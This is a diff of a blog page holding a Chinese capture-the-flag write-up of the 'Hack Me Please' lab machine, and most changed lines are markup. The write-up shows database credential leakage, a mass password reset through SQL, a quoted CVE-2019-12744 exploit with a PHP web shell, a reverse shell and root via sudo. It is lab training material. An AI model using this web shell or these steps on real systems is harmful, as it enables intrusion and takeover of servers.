@@ -116,33 +116,15 @@
         <li><a class="icon" aria-label="上一篇" href="/2022/05/26/Breach-1.0%20Writeup/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="下一篇" href="/2022/05/25/ICA1%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="下一篇" href="/2022/05/25/Hackable%E2%85%A2%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/26/Hack%20Me%20Please%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/26/Hack%20Me%20Please%20Writeup/&text=Hack Me Please Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/26/Hack%20Me%20Please%20Writeup/&title=Hack Me Please Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/26/Hack%20Me%20Please%20Writeup/&is_video=false&description=Hack Me Please Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Hack Me Please Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/26/Hack%20Me%20Please%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/26/Hack%20Me%20Please%20Writeup/&title=Hack Me Please Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/26/Hack%20Me%20Please%20Writeup/&title=Hack Me Please Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/26/Hack%20Me%20Please%20Writeup/&title=Hack Me Please Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/26/Hack%20Me%20Please%20Writeup/&title=Hack Me Please Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/26/Hack%20Me%20Please%20Writeup/&name=Hack Me Please Writeup&description=&lt;p&gt;该靶机官方的难度为简单，但是其实并不简单，很考验信息收集能力。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/26/Hack%20Me%20Please%20Writeup/&t=Hack Me Please Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">2. 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. MySQL服务</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#get-shell"><span class="toc-number">3.</span> <span class="toc-text">3. get shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.</span> <span class="toc-text">4. 权限提升</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">5. 总结</span></a></li></ol>
     </div>
@@ -169,8 +151,6 @@
     <div class="postdate">
       
         <time datetime="2022-05-25T16:00:00.000Z" itemprop="datePublished">2022-05-26</time>
-        
-        (Updated: <time datetime="2022-05-29T00:58:42.025Z" itemprop="dateModified">2022-05-29</time>)
         
       
     </div>
@@ -235,23 +215,18 @@
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526114053.png" /></p>
 <p>访问该文件，得到数据库信息：</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526114147.png" /></p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">dbDriver="mysql" 
-dbHostname="localhost" 
-dbDatabase="seeddms" 
-dbUser="seeddms" 
-dbPass="seeddms" 
-doNotCheckVersion="false"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dbDriver=&quot;mysql&quot; </span><br><span class="line">dbHostname=&quot;localhost&quot; </span><br><span class="line">dbDatabase=&quot;seeddms&quot; </span><br><span class="line">dbUser=&quot;seeddms&quot; </span><br><span class="line">dbPass=&quot;seeddms&quot; </span><br><span class="line">doNotCheckVersion=&quot;false&quot;</span><br></pre></td></tr></table></figure>
 <h2 id="mysql服务">2.3. MySQL服务</h2>
-<p>输入下面命令远程连接： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mysql -h <span class="token number">10.0</span>.2.57 -u seeddms -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>输入下面命令远程连接： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 10.0.2.57 -u seeddms -p</span><br></pre></td></tr></table></figure></p>
 <p>在 seeddms 数据库中的 users 表中得到如下信息：</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526121829.png" /></p>
 <p>在 seeddms 数据库中的 tblUsers 表中找到了用户登录后台的信息</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526115616.png" /></p>
-<p>将 admin 的密码进行暴力破解，但是失败了。后来想到<strong>可以直接修改密码</strong>，不过修改完的必须是md5加密的（一般都是md5加密）。所以可以利用下面命令生成md5加密的密码： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">echo</span> -n  <span class="token number">123456</span>  <span class="token operator">|</span> openssl md5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>将 admin 的密码进行暴力破解，但是失败了。后来想到<strong>可以直接修改密码</strong>，不过修改完的必须是md5加密的（一般都是md5加密）。所以可以利用下面命令生成md5加密的密码： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n  123456  | openssl md5</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>注意：<code>-n</code> 表示不输入回车符。如果不加，则会默认在字符串后面加上回车，然后再加密。</p>
 </blockquote>
-<p>然后在数据库中输入如下命令修改：(下面的命令会修改所有用户的密码，不过这里无所谓了) <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">update</span> tblUsers <span class="token keyword">set</span> pwd<span class="token operator">=</span><span class="token string">'e10adc3949ba59abbe56e057f20f883e'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>然后在数据库中输入如下命令修改：(下面的命令会修改所有用户的密码，不过这里无所谓了) <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update tblUsers <span class="keyword">set</span> pwd<span class="operator">=</span><span class="string">&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
 <p>然后利用 <code>admin:123456</code> 登录后台</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526120054.png" /></p>
 <h1 id="get-shell">3. get shell</h1>
@@ -259,55 +234,23 @@ doNotCheckVersion="false"<span aria-hidden="true" class="line-numbers-rows"><spa
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526120859.png" /></p>
 <p>点击保存文档之后页面会是空白的，但是其实已经上传成功了，回到后台主页面刷新以下即可</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526121020.png" /></p>
-<p>但是我们还不知道文件上传之后的路径，这时候想起来之前查询seeddms的漏洞的时候有一些漏洞，其中有一个RCE漏洞，查看内容 <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt"># Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions &lt;5.1.11]
-# Google Dork: [NA]
-# Date: [20-June-2019]
-# Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)
-# Vendor Homepage: [https://www.seeddms.org]
-# Software Link: [https://sourceforge.net/projects/seeddms/files/]
-# Version: [SeedDMS versions &lt;5.1.11] (REQUIRED)
-# Tested on: [NA]
-# CVE : [CVE-2019-12744]
-
-Exploit Steps:
-
-Step 1: Login to the application and under any folder add a document.
-Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.
-
-PHP Backdoor Code:
-&lt;?php
-
-if(isset($_REQUEST['cmd']))&#123;
-        echo "&lt;pre>";
-        $cmd = ($_REQUEST['cmd']);
-        system($cmd);
-        echo "&lt;/pre>";
-        die;
-&#125;
-
-?>
-
-Step 3: Now after uploading the file check the document id corresponding to the document.
-Step 4: Now go to example.com/data/1048576/"document_id"/1.php?cmd=cat+/etc/passwd to get the command response in browser.
-
-Note: Here "data" and "1048576" are default folders where the uploaded files are getting saved.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>但是我们还不知道文件上传之后的路径，这时候想起来之前查询seeddms的漏洞的时候有一些漏洞，其中有一个RCE漏洞，查看内容 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions &lt;5.1.11]</span><br><span class="line"># Google Dork: [NA]</span><br><span class="line"># Date: [20-June-2019]</span><br><span class="line"># Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)</span><br><span class="line"># Vendor Homepage: [https://www.seeddms.org]</span><br><span class="line"># Software Link: [https://sourceforge.net/projects/seeddms/files/]</span><br><span class="line"># Version: [SeedDMS versions &lt;5.1.11] (REQUIRED)</span><br><span class="line"># Tested on: [NA]</span><br><span class="line"># CVE : [CVE-2019-12744]</span><br><span class="line"></span><br><span class="line">Exploit Steps:</span><br><span class="line"></span><br><span class="line">Step 1: Login to the application and under any folder add a document.</span><br><span class="line">Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.</span><br><span class="line"></span><br><span class="line">PHP Backdoor Code:</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_REQUEST[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">        echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">        $cmd = ($_REQUEST[&#x27;cmd&#x27;]);</span><br><span class="line">        system($cmd);</span><br><span class="line">        echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">        die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Step 3: Now after uploading the file check the document id corresponding to the document.</span><br><span class="line">Step 4: Now go to example.com/data/1048576/&quot;document_id&quot;/1.php?cmd=cat+/etc/passwd to get the command response in browser.</span><br><span class="line"></span><br><span class="line">Note: Here &quot;data&quot; and &quot;1048576&quot; are default folders where the uploaded files are getting saved.</span><br></pre></td></tr></table></figure></p>
 <p>可以看到原理其实也是登录后台，然后上传后门。step4里面就有路径，尝试一下，</p>
 <p>首先得到我们的documentid</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526121500.png" /></p>
-<p>然后访问： <pre class="line-numbers language-url" data-language="url"><code class="language-url">http:&#x2F;&#x2F;10.0.2.57&#x2F;seeddms51x&#x2F;data&#x2F;1048576&#x2F;6&#x2F;1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>然后访问： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.57/seeddms51x/data/1048576/6/1.php</span><br></pre></td></tr></table></figure></p>
 <p>注意kali要提前监听对应端口。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526121618.png" /></p>
 <p>成功反弹shell</p>
 <h1 id="权限提升">4. 权限提升</h1>
 <p>查看 /etc/passwd，发现存在一个用户 saket，注意到刚刚在数据库中得到的信息 [[#MySQL服务]]</p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">username:saket
-password:Saket@#$1337<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>直接切换到 saket 用户 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">su</span> saket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:saket</span><br><span class="line">password:Saket@#$1337</span><br></pre></td></tr></table></figure>
+<p>直接切换到 saket 用户 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su saket</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526122053.png" /></p>
 <p>成功，并且该用户是 lxd 组的用户。注意[[lxd提权]]</p>
-<p>既然我们具有该用户的密码，必然需要查看以下sudo配置 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>既然我们具有该用户的密码，必然需要查看以下sudo配置 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526122151.png" /></p>
-<p>居然具有全部的权限，那么直接输入下面命令提升为root： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">su</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>居然具有全部的权限，那么直接输入下面命令提升为root： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526122223.png" /></p>
 <h1 id="总结">5. 总结</h1>
 <p>该靶机并不没有想象中那么简单，尤其是拿到webshell的过程，需要查看js，xml等文档，一般打靶的过程，这些类型的文档是不怎么看的。涉及的攻击方法有：</p>
@@ -373,7 +316,6 @@ password:Saket@#$1337<span aria-hidden="true" class="line-numbers-rows"><span></
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
